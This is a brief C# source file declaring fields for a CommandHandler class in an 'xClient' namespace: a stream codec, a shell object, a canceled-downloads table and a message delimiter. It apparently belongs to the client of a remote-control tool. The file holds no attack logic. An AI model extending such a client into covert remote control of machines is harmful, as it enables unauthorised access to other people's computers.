using System.Collections.Generic;
using xClient.Core.Utilities;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN VARIABLES OR P/INVOKES NECESSARY FOR VARIOUS COMMANDS (if needed). */
    public static partial class CommandHandler
    {
        public static UnsafeStreamCodec StreamCodec;
        private static Shell _shell;
        private static Dictionary<int, string> _canceledDownloads = new Dictionary<int, string>();
        private const string DELIMITER = "$E$";
    }
}